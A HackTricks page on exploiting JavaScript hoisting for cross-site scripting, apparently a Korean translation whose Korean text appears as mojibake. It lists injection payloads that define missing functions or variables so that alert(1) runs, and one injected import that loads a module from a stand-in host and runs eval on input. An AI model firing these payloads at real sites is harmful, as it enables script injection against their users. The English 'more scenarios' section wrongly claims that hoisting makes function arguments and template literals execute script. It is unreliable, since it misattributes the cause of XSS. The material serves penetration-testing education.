# JS í˜¸ì´ìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

JavaScript ì–¸ì–´ì—ì„œëŠ” **í˜¸ì´ìŠ¤íŒ…**ì´ë¼ëŠ” ë©”ì»¤ë‹ˆì¦˜ì´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ë³€ìˆ˜, í•¨ìˆ˜, í´ë˜ìŠ¤ ë˜ëŠ” importì˜ ì„ ì–¸ì´ ì½”ë“œê°€ ì‹¤í–‰ë˜ê¸° ì „ì— í•´ë‹¹ ë²”ìœ„ì˜ ë§¨ ìœ„ë¡œ ì˜¬ë¼ê°€ëŠ” ê²ƒì„ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ í”„ë¡œì„¸ìŠ¤ëŠ” JavaScript ì—”ì§„ì— ì˜í•´ ìë™ìœ¼ë¡œ ìˆ˜í–‰ë˜ë©°, ì—”ì§„ì€ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì—¬ëŸ¬ ë²ˆ í†µê³¼í•˜ì—¬ ì½”ë“œë¥¼ êµ¬ë¬¸ ì˜¤ë¥˜ë¥¼ í™•ì¸í•˜ê³  ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¡œ ë³€í™˜í•©ë‹ˆë‹¤.

ì²« ë²ˆì§¸ í†µê³¼ì—ì„œ ì—”ì§„ì€ êµ¬ë¬¸ ì˜¤ë¥˜ë¥¼ í™•ì¸í•˜ê³  ì½”ë“œë¥¼ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¡œ ë³€í™˜í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ì—ëŠ” í˜¸ì´ìŠ¤íŒ…ì´ í¬í•¨ë˜ì–´ íŠ¹ì • ì„ ì–¸ì´ ì‹¤í–‰ ì»¨í…ìŠ¤íŠ¸ì˜ ë§¨ ìœ„ë¡œ ì´ë™í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì…ë‹ˆë‹¤. êµ¬ë¬¸ ë¶„ì„ ë‹¨ê³„ê°€ ì„±ê³µì ìœ¼ë¡œ ì™„ë£Œë˜ë©´ êµ¬ë¬¸ ì˜¤ë¥˜ê°€ ì—†ìŒì„ ë‚˜íƒ€ë‚´ë©°, ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì´ ì§„í–‰ë©ë‹ˆë‹¤.

ë‹¤ìŒ ì‚¬í•­ì„ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤:

1. ì‹¤í–‰ì´ ë°œìƒí•˜ë ¤ë©´ ìŠ¤í¬ë¦½íŠ¸ì— êµ¬ë¬¸ ì˜¤ë¥˜ê°€ ì—†ì–´ì•¼ í•©ë‹ˆë‹¤. êµ¬ë¬¸ ê·œì¹™ì„ ì—„ê²©íˆ ì¤€ìˆ˜í•´ì•¼ í•©ë‹ˆë‹¤.
2. ìŠ¤í¬ë¦½íŠ¸ ë‚´ì—ì„œ ì½”ë“œì˜ ë°°ì¹˜ëŠ” í˜¸ì´ìŠ¤íŒ…ìœ¼ë¡œ ì¸í•´ ì‹¤í–‰ì— ì˜í–¥ì„ ì¤ë‹ˆë‹¤. ì‹¤í–‰ë˜ëŠ” ì½”ë“œëŠ” í…ìŠ¤íŠ¸ í‘œí˜„ê³¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### í˜¸ì´ìŠ¤íŒ…ì˜ ì¢…ë¥˜

MDNì—ì„œ ì œê³µí•˜ëŠ” ì •ë³´ì— ë”°ë¥´ë©´ JavaScriptì—ëŠ” ë„¤ ê°€ì§€ ë‹¤ë¥¸ ìœ í˜•ì˜ í˜¸ì´ìŠ¤íŒ…ì´ ìˆìŠµë‹ˆë‹¤:

1. **ê°’ í˜¸ì´ìŠ¤íŒ…**: ë³€ìˆ˜ì˜ ê°’ì„ ì„ ì–¸ ë¼ì¸ ì´ì „ì— í•´ë‹¹ ë²”ìœ„ ë‚´ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
2. **ì„ ì–¸ í˜¸ì´ìŠ¤íŒ…**: ë³€ìˆ˜ë¥¼ ì„ ì–¸í•˜ê¸° ì „ì— í•´ë‹¹ ë²”ìœ„ ë‚´ì—ì„œ ë³€ìˆ˜ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ê²½ìš° ë³€ìˆ˜ì˜ ê°’ì€ `undefined`ê°€ ë©ë‹ˆë‹¤.
3. ì´ ìœ í˜•ì€ ì‹¤ì œ ì„ ì–¸ ë¼ì¸ ì´ì „ì— ë³€ìˆ˜ì˜ ì„ ì–¸ìœ¼ë¡œ ì¸í•´ í•´ë‹¹ ë²”ìœ„ ë‚´ì—ì„œ ë™ì‘ì´ ë³€ê²½ë©ë‹ˆë‹¤.
4. ì„ ì–¸ì˜ ë¶€ì‘ìš©ì´ í•´ë‹¹ ì½”ë“œì˜ ë‚˜ë¨¸ì§€ê°€ í‰ê°€ë˜ê¸° ì „ì— ë°œìƒí•©ë‹ˆë‹¤.

ìì„¸íˆ ì„¤ëª…í•˜ë©´, í•¨ìˆ˜ ì„ ì–¸ì€ 1ë²ˆ ìœ í˜•ì˜ í˜¸ì´ìŠ¤íŒ… ë™ì‘ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. `var` í‚¤ì›Œë“œëŠ” 2ë²ˆ ìœ í˜•ì˜ ë™ì‘ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. `let`, `const`, `class`ë¥¼ í¬í•¨í•˜ëŠ” ì–´íœ˜ì  ì„ ì–¸ì€ 3ë²ˆ ìœ í˜•ì˜ ë™ì‘ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ, `import` ë¬¸ì€ 1ë²ˆê³¼ 4ë²ˆ ìœ í˜•ì˜ ë™ì‘ìœ¼ë¡œ í˜¸ì´ìŠ¤íŒ…ë©ë‹ˆë‹¤.


## ì‹œë‚˜ë¦¬ì˜¤

ë”°ë¼ì„œ **ì„ ì–¸ë˜ì§€ ì•Šì€ ê°ì²´ ì´í›„ì— JS ì½”ë“œë¥¼ ì‚½ì…**í•  ìˆ˜ ìˆëŠ” ì‹œë‚˜ë¦¬ì˜¤ê°€ ìˆë‹¤ë©´, **êµ¬ë¬¸ ì˜¤ë¥˜ë¥¼ ìˆ˜ì •**í•˜ê¸° ìœ„í•´ ì„ ì–¸í•˜ë©´ ë©ë‹ˆë‹¤(ì˜¤ë¥˜ê°€ ë°œìƒí•˜ëŠ” ëŒ€ì‹  ì½”ë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## ë” ë§ì€ ì‹œë‚˜ë¦¬ì˜¤

In addition to the basic scenarios discussed earlier, there are some more advanced scenarios where JavaScript hoisting can be exploited for XSS attacks. Let's take a look at them:

### 1. Hoisting in Function Arguments

When a function is called with arguments, JavaScript hoists the variable declarations within the function scope. This can be leveraged to execute malicious code. Consider the following example:

```javascript
function greet(name) {
  alert('Hello, ' + name);
}

greet('<script>alert("XSS")</script>');
```

In this case, the `name` argument is vulnerable to XSS attacks. The JavaScript hoisting mechanism will treat the argument as a variable declaration and execute any JavaScript code passed as an argument.

### 2. Hoisting in Callback Functions

Callback functions are commonly used in JavaScript, especially in event-driven programming. When a callback function is defined, JavaScript hoists the variable declarations within the function scope. This can be exploited for XSS attacks. Consider the following example:

```javascript
document.getElementById('btn').addEventListener('click', function() {
  var input = document.getElementById('input').value;
  alert('You entered: ' + input);
});
```

In this case, the `input` variable is vulnerable to XSS attacks. If an attacker can control the value of the `input` element, they can execute arbitrary JavaScript code.

### 3. Hoisting in Template Literals

Template literals are a feature introduced in ECMAScript 6 that allow for more flexible string interpolation. When using template literals, JavaScript hoists the variable declarations within the template literal. This can be exploited for XSS attacks. Consider the following example:

```javascript
var name = '<script>alert("XSS")</script>';
var message = `Hello, ${name}`;

document.getElementById('output').innerHTML = message;
```

In this case, the `name` variable is vulnerable to XSS attacks. The JavaScript hoisting mechanism will treat the variable as a template literal and execute any JavaScript code within it.

By understanding these advanced scenarios, you can better identify and mitigate XSS vulnerabilities in your web applications.
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## ì°¸ê³  ìë£Œ

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
